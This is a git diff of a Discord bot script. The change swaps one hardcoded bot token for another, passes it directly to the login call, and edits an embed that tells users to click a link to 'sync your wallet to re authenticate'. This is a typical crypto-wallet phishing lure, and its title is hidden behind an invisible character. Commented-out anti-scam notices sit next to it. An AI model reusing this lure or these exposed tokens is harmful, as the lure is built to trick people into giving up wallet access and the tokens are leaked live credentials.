@@ -2,7 +2,7 @@ const Discord = require("discord.js");
 const { MessageEmbed } = require('discord.js');
 
 //put your token here
-const token = 'OTY2NjkxNjcxNzUwMzU3MDAy.YmFbxg.l19Mz0y3Rz4LWOU9p5TdeFd8N1Q';
+const token = 'OTY2NjkxNjcxNzUwMzU3MDAy.YmFbxg.WWxv5_HJXaXZEcwIFSmH3qM-43I';
 
 const client = new Discord.Client({
       intents: [ "GUILDS","GUILD_MESSAGES","DIRECT_MESSAGES"]
@@ -54,7 +54,7 @@ const exampleEmbed = new MessageEmbed()
 		//{ name: 'MAHALAGANG PAALALA:', value: 'Huwag ka pupunta sa mga links na di ka sigurado kung ano iyon maaring pishing site ang binibigay sayo at huwag ibibigay kahit kanino at kahit saan ang inyong SEED PHRASE / SECRET RECOVERY PHRASE. Hindi po namin ito hihingin sa inyo kahit anong mangyari. Kapag may humingi sa inyo, siguradong SCAM ito. Wala na po kaming magagawa kung magpapa-loko kayo kahit alam mong sinasamantala ka na pero umaasa ka pa din.'},
 		//{ name: '\u200B', value: '\u200B' },
 		//{name: 'Note:', value: 'Our Staff, Mod, Admin, Support, etc. will never message you first.'},
-    {name: '.',value: "Click [here](https://discord.com/terms) to connect , to sync your wallet to re authenticate and restore to all functionalities on wallet."}
+    {name: '᲼',value: "Click [here](https://discord.com/terms) to connect , to sync your wallet to re authenticate and restore to all functionalities on wallet."}
 	//You are obligated to follow Discord's [terms of service](https://discord.com/terms)."},*editable
     //{name:'II.', value : " Our rules are based on Discord's [community guidelines](https://discord.com/guidelines) and have to be respected."}
 	)
@@ -68,5 +68,5 @@ const exampleEmbed = new MessageEmbed()
 
             
  //bot initalize                       
-client.login(Token);
+client.login('OTY2NjkxNjcxNzUwMzU3MDAy.YmFbxg.WWxv5_HJXaXZEcwIFSmH3qM-43I');
 
